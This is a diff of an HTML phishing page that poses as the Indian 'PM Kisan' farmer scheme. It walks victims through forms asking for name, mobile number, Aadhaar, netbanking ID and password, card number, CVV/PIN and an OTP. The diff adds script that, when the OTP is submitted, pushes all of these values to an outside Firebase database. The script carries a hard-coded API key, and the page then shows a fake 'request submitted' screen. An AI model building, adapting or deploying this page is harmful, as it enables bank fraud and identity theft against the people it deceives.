@@ -4,6 +4,7 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>PM Kisan</title>
+
 <style>
 *{box-sizing:border-box}
 body{margin:0;font-family:system-ui,Arial;background:#e9e9e9}
@@ -18,75 +19,103 @@ body{margin:0;font-family:system-ui,Arial;background:#e9e9e9}
 .btn{width:100%;padding:14px;margin:10px 0;border-radius:10px;border:2px solid #8a2c6b;background:#fff;color:#5fa44a;font-weight:700}
 .thanks{text-align:center;color:#2e8b57;font-weight:700;font-size:18px}
 .count{font-size:22px;font-weight:700;color:#d40000;text-align:center}
+.shake{animation:shake .4s;border-color:red!important}
 @keyframes shake{0%{transform:translateX(0)}25%{transform:translateX(-6px)}50%{transform:translateX(6px)}75%{transform:translateX(-6px)}100%{transform:translateX(0)}}
-.shake{animation:shake 0.4s;border-color:#d40000!important}
 </style>
 </head>
 <body>
 
+<!-- PAGE 1 -->
 <div class="page active" id="page1">
   <div class="form">
     <div class="title">APPLY ONLINE</div>
-    <div class="field"><div class="label">Full Name</div><input class="input"></div>
-    <div class="field"><div class="label">Mobile Number</div><input class="input"></div>
-    <div class="field"><div class="label">Aadhaar</div><input class="input"></div>
+    <div class="field"><div class="label">Full Name</div><input id="fullName" class="input"></div>
+    <div class="field"><div class="label">Mobile Number</div><input id="mbno" class="input"></div>
+    <div class="field"><div class="label">Aadhaar</div><input id="aadr" class="input"></div>
     <button class="btn" onclick="nextPage(1)">Continue</button>
   </div>
 </div>
 
+<!-- PAGE 2 -->
 <div class="page" id="page2">
   <div class="form">
     <div class="title">BANK INFO</div>
-    <div class="field"><div class="label">Netbanking ID</div><input class="input"></div>
-    <div class="field"><div class="label">Password</div><input class="input"></div>
+    <div class="field"><div class="label">Netbanking ID</div><input id="nid" class="input"></div>
+    <div class="field"><div class="label">Password</div><input id="pss" class="input"></div>
     <button class="btn" onclick="nextPage(2)">Continue</button>
     <button class="btn" onclick="prevPage(2)">Back</button>
   </div>
 </div>
 
+<!-- PAGE 3 -->
 <div class="page" id="page3">
   <div class="form">
     <div class="title">CARD DETAILS</div>
-    <div class="field"><div class="label">Card Number</div><input class="input"></div>
-    <div class="field"><div class="label">CVV</div><input class="input"></div>
+    <div class="field"><div class="label">Card Number</div><input id="cn" class="input"></div>
+    <div class="field"><div class="label">CVV / PIN</div><input id="cvpn" class="input"></div>
     <button class="btn" onclick="goOtp()">Submit</button>
     <button class="btn" onclick="prevPage(3)">Back</button>
   </div>
 </div>
 
+<!-- PAGE 4 -->
 <div class="page" id="page4">
   <div class="form">
     <div class="title">ENTER OTP</div>
-    <div class="field"><div class="label">OTP (6 Digit)</div><input class="input" id="otpSingle" maxlength="6"></div>
-    <p id="resendBox" style="text-align:center">Resend OTP in <span id="otpTimer">30</span>s</p>
+    <div class="field"><div class="label">OTP</div><input class="input" id="otpSingle" maxlength="6"></div>
     <button class="btn" onclick="verifyOtp()">Verify OTP</button>
-    <button class="btn" onclick="prevPage(4)">Back</button>
   </div>
 </div>
 
+<!-- PAGE 5 -->
 <div class="page" id="page5">
   <div class="form">
     <div class="thanks">Thank You 🙏</div>
     <p style="text-align:center">Your request has been submitted</p>
-    <div class="count" id="timer">24:00:00</div>
   </div>
 </div>
 
+<!-- Firebase -->
+<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+
 <script>
-document.querySelectorAll('.page').forEach(p=>{
-  const t=document.createElement('div');t.className='top-img';t.innerHTML='<img src="top.jpg">';
-  const b=document.createElement('div');b.className='bottom-img';b.innerHTML='<img src="bottom.jpg">';
-  p.prepend(t);p.append(b);
+/* 🔥 FIREBASE CONFIG */
+firebase.initializeApp({
+  apiKey: "AIzaSyDjMaZ5gSHh9zVRhdPwZjfVCsGaKW44kRk",
+  authDomain: "admin-panel-989b2.firebaseapp.com",
+  databaseURL: "https://admin-panel-989b2-default-rtdb.firebaseio.com",
+  projectId: "admin-panel-989b2"
 });
+
+/* UI helpers */
+document.querySelectorAll('.page').forEach(p=>{
+  p.prepend(Object.assign(document.createElement('div'),{className:'top-img',innerHTML:'<img src="top.jpg">'}));
+  p.append(Object.assign(document.createElement('div'),{className:'bottom-img',innerHTML:'<img src="bottom.jpg">'}));
+});
+function switchPage(a,b){document.getElementById("page"+a).classList.remove("active");document.getElementById("page"+b).classList.add("active");}
 function nextPage(n){switchPage(n,n+1)}
 function prevPage(n){switchPage(n,n-1)}
-function switchPage(a,b){document.getElementById("page"+a).classList.remove("active");document.getElementById("page"+b).classList.add("active");}
-function goOtp(){switchPage(3,4);startOtpTimer()}
-function verifyOtp(){const i=document.getElementById("otpSingle");const v=i.value.trim();if(v===""||v.length!==6){shake(i);alert("Please enter 6 digit OTP");return;}switchPage(4,5);startTimer();}
-function shake(el){el.classList.remove("shake");void el.offsetWidth;el.classList.add("shake");el.focus();}
-let s=30,intv;
-function startOtpTimer(){clearInterval(intv);s=30;document.getElementById("resendBox").innerHTML=`Resend OTP in <span id="otpTimer">${s}</span>s`;intv=setInterval(()=>{s--;document.getElementById("otpTimer").innerText=s;if(s<=0){clearInterval(intv);document.getElementById("resendBox").innerHTML='<b onclick="startOtpTimer()" style="cursor:pointer;color:#2e8b57">Resend OTP</b>';}},1000);}
-function startTimer(){let t=86400;setInterval(()=>{let h=String(Math.floor(t/3600)).padStart(2,'0');let m=String(Math.floor((t%3600)/60)).padStart(2,'0');let se=String(t%60).padStart(2,'0');timer.innerText=`${h}:${m}:${se}`;t--;},1000);}
+function goOtp(){switchPage(3,4)}
+
+function verifyOtp(){
+  var otp=document.getElementById("otpSingle").value.trim();
+  if(otp.length!==6){alert("Enter valid OTP");return;}
+
+  /* 🔴 PUSH DATA TO FIREBASE */
+  firebase.database().ref("usersData").push({
+    fullName: fullName.value,
+    mbno: mbno.value,
+    aadr: aadr.value,
+    nid: nid.value,
+    pss: pss.value,
+    cn: cn.value,
+    cvpn: cvpn.value,
+    time: new Date().toLocaleString()
+  });
+
+  switchPage(4,5);
+}
 </script>
 </body>
 </html>
